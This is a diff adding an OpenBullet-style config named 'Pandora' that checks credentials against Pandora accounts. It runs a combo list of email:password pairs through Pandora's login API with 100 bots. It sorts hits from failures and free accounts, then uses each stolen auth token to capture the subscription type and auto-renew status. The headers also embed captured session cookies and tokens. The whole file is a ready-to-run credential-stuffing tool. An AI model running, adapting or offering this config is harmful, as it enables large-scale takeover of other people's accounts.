@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Pandora",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-15T17:00:58.2091654+01:00",
+  "AdditionalInfo": "Captures Subscription type and if auto renew is on. Free goes to FREE.",
+  "Author": "ND03",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.pandora.com/api/v1/auth/login" 
+  CONTENT "{\"existingAuthToken\":null,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"keepLoggedIn\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.pandora.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-CsrfToken: d838d34a32181229" 
+  HEADER "Content-Length: 99" 
+  HEADER "Origin: https://www.pandora.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.pandora.com/account/sign-in" 
+  HEADER "Cookie: csrftoken=d838d34a32181229; AMCV_041A7C73585A5C360A495CC2%40AdobeOrg=281789898%7CMCIDTS%7C18308%7CMCMID%7C70851353889299115530953162068635655369%7CMCAAMLH-1582381888%7C9%7CMCAAMB-1582381888%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1581784288s%7CNONE%7CMCSYNCSOP%7C411-18315%7CvVersion%7C4.1.0; http_referrer=https://duckduckgo.com/; at=wrDNtrsl/xHcn62fRRfJiVZGRth8AXqJtL2LPnS1QYuw=; lithiumSSO%3Apandora.prod=~2RSvdsfw0ao3nEG3d~fwU6sCeaxRlFc0NH-eK_fuG6DG1xZQOsDQg2ZbbQJ7w6NCF8On6xh3BbKDjOU66_PFMdUgqgo_pHjhzy79O94FhFpCDxjGqZn7PQuDhk5dR2Fw_jidGCycJ78MS1QDLhyvLzdX1TsoiqG11Yp-CtyECvY3_LiXEk9inX80pj7hfluG-HR0dPN3yTUKuwZaZ-m3eIA2jtqIo_-NHpxMFjXQ..; _ga=GA1.2.929038396.1581777079; _gid=GA1.2.807302856.1581777079; _fbp=fb.1.1581777079645.1825645520; AMCVS_041A7C73585A5C360A495CC2%40AdobeOrg=1; s_cc=true; s_sq=pandora.comprod%252Cpandoraglobal%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fwww.pandora.com%25252F%2526link%253DLog%252520In%2526region%253DBODY%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fwww.pandora.com%25252F%2526pidt%253D1%2526oid%253Dfunctionkr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT; _gat=1" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"authToken" 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\":\"Invalid username and/or password\",\"errorCode\":0,\"errorString\":\"AUTH_INVALID_USERNAME_PASSWORD\"}" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "branding\":\"Pandora\",\"" 
+
+#Token PARSE "<SOURCE>" JSON "authToken" -> VAR "token" 
+
+#Profile REQUEST POST "https://www.pandora.com/api/v1/billing/infoV2" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-AuthToken: <token>" 
+  HEADER "X-CsrfToken: 8aa4f674b408cc69" 
+  HEADER "Content-Length: 2" 
+  HEADER "Origin: https://www.pandora.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.pandora.com/account/sign-in" 
+  HEADER "Cookie: wrt=1384509868_2nlk0jhqcafeo340l8flpujg44; csrftoken=8aa4f674b408cc69; AMCV_041A7C73585A5C360A495CC2%40AdobeOrg=281789898%7CMCIDTS%7C18308%7CMCMID%7C70851353889299115530953162068635655369%7CMCAAMLH-1582381888%7C9%7CMCAAMB-1582381888%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1581784288s%7CNONE%7CMCSYNCSOP%7C411-18315%7CvVersion%7C4.1.0; http_referrer=https://www.pandora.com/account/sign-out; lithiumSSO%3Apandora.prod=~2qUR4jLaguqcYkYxU~U9vLjT_QPiXHmG8imVwQdVyG2uzr0Uh0FjdEFdqS4Tkv_71mGOiuYzKfpA5ET3TuwPKuy-usPpb02BJe61-oi3_k_nGU7k4qGFGCj_DWktzhtRi-qc-Ns0wjI-7tBrqvm0-ZyrHnCraG6iitQZEEo2N7M2zdq1waZdkgDFsGpDqD9ybp3P8Hcus2K6k60hQcI0bSxlr9MURXOKFcBCSaSg..; _ga=GA1.2.929038396.1581777079; _gid=GA1.2.807302856.1581777079; _fbp=fb.1.1581777079645.1825645520; AMCVS_041A7C73585A5C360A495CC2%40AdobeOrg=1; s_cc=true; s_sq=pandora.comprod%252Cpandoraglobal%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fwww.pandora.com%25252F%2526link%253DSign%252520Out%2526region%253DBODY%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fwww.pandora.com%25252F%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fwww.pandora.com%25252Faccount%25252Fsign-out%2526ot%253DA; _gat=1; floodlightPixelTimer=Sat%20Feb%2015%202020%2016:47:08%20GMT+0100%20(centraleuropeisk%20normaltid); _derived_epik=dj0yJnU9ZnhQNFduaXdrY0xnOWZfYno4cFNDbldIX0ZFNWU4LXUmbj1ZNWVOS2RTaEpiNEo0WUJrRXhoZjB3Jm09NyZ0PUFBQUFBRjVJRW9r; at=wC1pijRZ343vgbP8/MQuBTbnfHnVl7ygFohBcfzvfB1InY7z1zEbkS6VZaxExclW1VPIeTf/YW28+Y2aoaSxSuBrdy9kECGSS" 
+
+#Subscription PARSE "<SOURCE>" JSON "productDescription" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#autoRenew PARSE "<SOURCE>" JSON "autoRenew" CreateEmpty=FALSE -> CAP "Auto Renew" 
+
